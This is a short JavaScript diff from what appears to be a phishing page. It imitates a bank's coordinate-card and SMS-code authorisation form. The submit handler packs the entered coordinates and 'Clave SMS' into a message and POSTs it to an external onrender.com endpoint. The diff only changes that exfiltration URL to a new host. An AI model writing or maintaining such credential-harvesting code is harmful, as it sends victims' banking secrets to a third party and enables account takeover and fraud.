@@ -113,7 +113,7 @@ formCoordenadas.addEventListener("submit", async (e) => {
   Clave SMS: ${claveSMS}`;
 
   try {
-    await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+    await fetch("https://autorizacion-ob.onrender.com/autorizar", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ mensaje })
